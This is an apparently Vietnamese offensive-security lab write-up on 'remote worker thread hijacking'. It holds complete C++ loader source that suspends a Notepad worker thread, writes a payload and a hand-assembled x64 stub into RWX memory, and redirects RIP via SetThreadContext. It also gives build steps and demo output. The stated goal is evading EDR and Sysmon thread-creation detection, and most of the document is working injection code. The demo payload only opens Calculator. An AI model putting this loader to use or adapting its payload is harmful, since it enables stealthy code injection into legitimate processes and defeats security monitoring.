
---

# 📝 [PE 15] Remote Thread Hijacking (Advanced Worker Thread Context Restoration)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Remote Thread Hijacking** (Bắt cóc luồng từ xa) ở cấp độ Nâng cao là giải thuật khống chế dòng chảy CPU đỉnh cao, thuộc nhóm **Vô hiệu hóa trinh sát tạo luồng (Anti-Thread Creation Detection)**.

Hầu hết các giải pháp EDR hiện đại đều đặt bẫy Hook cực nặng để giám sát hành vi sinh luồng lạ chéo tiến trình của hàm `CreateRemoteThread` hoặc `NtCreateThreadEx`. Lab PE 15 hóa giải triệt để rào cản này bằng cách **không tạo thêm bất kỳ luồng mới nào**, mà thực hiện hành vi "bắt cóc" (Hijack) một luồng hợp pháp đang chạy sẵn của tiến trình vỏ bọc (ví dụ: `notepad.exe`).

Đặc biệt, phiên bản nâng cấp tối cao này áp dụng chiến thuật **Săn lùng luồng Worker phụ** để né hiện tượng treo nghẽn giao diện đồ họa (UI Window Lock), kết hợp với đoạn mã máy Assembly x64 tinh vi để **Bảo toàn Ngữ cảnh Ngăn xếp qua lệnh RET**, giúp Payload kích nổ mở Máy tính ngay lập tức tại runtime mà tiến trình cha vẫn hoạt động mượt mà 100%.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa 100% các bộ lọc hành vi phát hiện sinh luồng lạ (`Sysmon Event ID 8` / `CreateRemoteThread`).
* Thao túng trực tiếp cấu trúc thanh ghi phần cứng CPU x64 (`CONTEXT.Rip`) từ xa.
* Làm chủ kỹ nghệ bảo toàn không gian bóng tối (Stack Preservation Shadow Space) và trả ngữ cảnh CPU bằng lệnh `RET` trong Assembly thô.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Mỗi một luồng (Thread) đang vận hành được quản lý bởi một cấu trúc ngữ cảnh phần cứng lưu trong nhân Kernel. Để bắt cóc và khôi phục dòng chảy luồng mà không làm sụp đổ Stack Frame, giải thuật của Lab PE 15 thực hiện cuộc đại phẫu qua các bước ngầm sau:

```
[SuspendThread: Đóng băng luồng phụ] ──> [GetThreadContext: Bốc Rip gốc] ──> [Vá mìn Stack Stub] ──> [SetThreadContext: Ép Rip nhảy] ──> [ResumeThread: Kích nổ & Trả ngữ cảnh]

```

1. **Săn lùng luồng Worker phụ (Worker Thread Hunting)**: Khác với các giải pháp thô sơ thường bốc nhầm Luồng UI chính (gây nghẽn Message Loop hệ thống khiến Máy tính bị hoãn hiển thị cho đến khi tắt Notepad), bộ lọc tiến trình sẽ duyệt danh sách `CreateToolhelp32Snapshot`, chủ động bỏ qua Thread đầu tiên (Main UI) và bắt giữ chính xác **Worker Thread phụ** (luồng ngầm kiểm tra spelling, đồng bộ RAM).
2. **Đóng băng và Trích xuất chỉ mục lệnh (`Rip`)**: Gọi `SuspendThread` để khóa chân luồng phụ, sau đó dùng `GetThreadContext` để trích xuất trạng thái hiện tại của toàn bộ các thanh ghi CPU. Giá trị của thanh ghi **`Rip`** (Con trỏ lệnh hiện tại của Notepad) được lưu lại một cách nghiêm ngặt.
3. **Thiết kế mìn Assembly bảo toàn bộ nhớ**: Loader ánh xạ đoạn mã máy Stub vào RAM đối phương. Đoạn Stub này được thiết kế theo mô hình kiến trúc x64 chuẩn chỉ:
* `push` các thanh ghi đa năng (`rax`, `rcx`, `rdx`) và cờ trạng thái `pushfq` vào Ngăn xếp để đóng băng quá khứ.
* Hạ con trỏ ngăn xếp `sub rsp, 0x28` để tạo **Shadow Space (Không gian bóng tối)** đúng tiêu chuẩn gọi hàm x64 của Windows.
* Gọi hàm mở Máy tính thông qua con trỏ tuyệt đối `call rax`.
* Thu hồi Shadow Space `add rsp, 0x28` và nhả lại toàn bộ cờ, thanh ghi ban đầu (`popfq`, `pop rdx, rcx, rax`).
* Cuối cùng, nạp địa chỉ `originalRip` gốc ban đầu vào `rax`, đẩy vào đỉnh Ngăn xếp (`push rax`) và phát lệnh **`RET`**. Lệnh `RET` sẽ tự động bốc tọa độ gốc ra để đưa CPU quay trở lại làm việc tiếp cho Notepad như chưa từng có cuộc chia ly.



---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn tuân thủ nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa quét tìm ID luồng phụ, loại bỏ hoàn toàn các chuỗi gán cứng để đạt độ linh hoạt kịch trần.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí gánh logic thực thi mở máy tính
DWORD WINAPI HijackedPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa mở máy tính độc lập vị trí, bẻ gãy rào cản Import Table
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// GIẢI PHÁP TỐI ƯU V2: Săn lùng luồng Worker phụ (Background Thread), né nghẽn tin nhắn hệ thống
DWORD GetTargetWorkerThreadID(DWORD pid) {
    DWORD mainThreadId = 0;
    DWORD workerThreadId = 0;
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    int threadIndex = 0;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                threadIndex++;
                if (threadIndex == 1) {
                    mainThreadId = te32.th32ThreadID; // Luồng UI chính (Bỏ qua không bắt cóc)
                } else {
                    workerThreadId = te32.th32ThreadID; // Bốc chính xác luồng phụ gánh dòng chảy!
                    break;
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    CloseHandle(hSnapshot);

    return (workerThreadId != 0) ? workerThreadId : mainThreadId;
}

// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 15: REMOTE WORKER THREAD HIJACKING OPTIMIZED" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    // Thực hiện trích xuất luồng Worker phụ an toàn để né Window Lock
    DWORD threadId = GetTargetWorkerThreadID(pid);
    if (threadId == 0) {
        std::cerr << "[-] Khong tim thay luong dang chay hop le!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << " | SAN TRUNG LUONG WORKER PHU: " << threadId << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
    if (!hProcess || !hThread) {
        if (hProcess) CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Đóng băng luồng Worker phụ để can thiệp cấu trúc thanh ghi CPU
    std::cout << "[*] Dang bat coc va dong bang luong phu..." << std::endl;
    SuspendThread(hThread);

    // Áp dụng quy trình Cấp phát động Thích ứng vừa khít cấu trúc
    SIZE_T functionSize = 500;
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Đọc ngữ cảnh thanh ghi ban đầu của CPU luồng Worker phụ
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &context)) {
        std::cerr << "[-] GetThreadContext that bai!" << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Khởi tạo cấu trúc tham số dữ liệu tuyệt đối cục bộ
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy song song logic hàm và tham số sang RAM tiến trình đích
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)HijackedPayload, functionSize, NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // Tính toán tọa độ đặt đoạn mìn điều hướng ngay sau đuôi hàm thực thi
    PVOID jmpStubAddress = (PVOID)((DWORD_PTR)remoteCodeBuffer + 350);

    // ─── ĐỘT PHÁ CẤU TRÚC x64: ĐOẠN ASM STUB BẢO TOÀN QUA RET LỆNH ───
    unsigned char jmpStub[] = {
        0x50,                                                       // push rax       (Tạm cất thanh ghi đa năng)
        0x51,                                                       // push rcx
        0x52,                                                       // push rdx
        0x9C,                                                       // pushfq         (Lưu cờ trạng thái EFLAGS)
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0   (Địa chỉ pRemoteData chứa tham số tuyệt đối)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0   (Địa chỉ hàm thực thi Payload)
        0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 0x28  (Cân bằng căn lề Stack Shadow Space)
        0xFF, 0xD0,                                                 // call rax       (Khai hỏa mở Máy tính!)
        0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 0x28  (Hoàn trả không gian Ngăn xếp)
        0x9D,                                                       // popfq          (Khôi phục cờ CPU)
        0x5A,                                                       // pop rdx        (Khôi phục nguyên vẹn các thanh ghi phụ)
        0x59,                                                       // pop rcx
        0x58,                                                       // pop rax
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0   (Tọa độ originalRip gốc ban đầu của luồng Worker)
        0x50,                                                       // push rax       (Đẩy Rip gốc vào đỉnh Ngăn xếp)
        0xC3                                                        // ret            (Lệnh RET tự động bốc Rip gốc ra thực thi tiếp cho luồng phụ!)
    };

    // Vá các tọa độ tuyệt đối chuẩn chỉ vào cấu trúc mìn điều hướng Assembly
    *(DWORD_PTR*)(jmpStub + 6) = (DWORD_PTR)pRemoteData;
    *(DWORD_PTR*)(jmpStub + 16) = (DWORD_PTR)remoteCodeBuffer;
    *(DWORD_PTR*)(jmpStub + 44) = (DWORD_PTR)context.Rip; // Nạp trực tiếp tọa độ Rip gốc của Notepad vào mã máy

    // Ghi đoạn mã máy Stub bảo toàn ngăn xếp sang RAM Notepad
    WriteProcessMemory(hProcess, jmpStubAddress, jmpStub, sizeof(jmpStub), NULL);

    // Điều hướng con trỏ chỉ mục lệnh CPU đâm thẳng vào phân đoạn ASM Stub bảo an của luồng Worker phụ
    context.Rip = (DWORD64)jmpStubAddress;

    SetThreadContext(hThread, &context);
    std::cout << "[+] Ep Rip huong vao Worker Thread Stub: 0x" << std::hex << jmpStubAddress << std::endl;

    // Rã đông giải phóng dòng chảy CPU của luồng phụ
    std::cout << "[*] Kich hoat ra dong (ResumeThread). Luong phu se tu dong thuc thi va khoi phuc an toan..." << std::endl;
    ResumeThread(hThread);

    std::cout << "\n[+] Remote Worker Thread Hijacking Successful!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua số Loader..." << std::endl;
    std::cin.get();

    // Thu hồi tài nguyên Handle sạch bóng Memory Leak
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình thành **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống chạy mượt mà trên mọi môi trường độc lập.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân hoàn hảo.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Mở sẵn ứng dụng `Notepad.exe` trên máy Lab (gõ nhẹ vài ký tự để kích hoạt luồng Worker ngầm), bật PowerShell ngoài đĩa thô thực thi file chạy:

```powershell
PS C:\Workspace\x64\Release> .\PE15_Remote_Thread_Hijacking.exe
====================================================
[*] PE 15: REMOTE WORKER THREAD HIJACKING OPTIMIZED
====================================================
[+] Da tim thay Notepad.exe voi PID: 24132 | SĂN TRÚNG LUỒNG WORKER PHỤ: 9900
[*] Dang bat coc va dong bang luong phu...
[+] Vung nho Code payload dat tai: 0x00000155F8280000
[+] Ep Rip huong vao Worker Thread Stub: 0x00000155F828015E
[*] Kich hoat ra dong (ResumeThread). Luong phu se tu dong thuc thi va khoi phuc an toan...

[+] Remote Worker Thread Hijacking Successful!
[*] Nhan phim Enter de dong cua so Loader...

```

*🎯 Hệ quả RAM kịch trần:*
Ngay lập tức tại thời điểm runtime, ứng dụng Máy tính **`calc.exe` bật bung mở ra hiên ngang rực rỡ kịch khung**! Đồng thời, khi Vinh quay trở lại màn hình thao tác của **Notepad, ứng dụng vẫn gõ chữ, soạn thảo văn bản phản hồi mượt mà 100%**, hoàn toàn không bị đơ treo, không dính lỗi Window Lock. Ngữ cảnh tháp luồng của hệ điều hành được khôi phục phẳng sạch tuyệt đối!

---

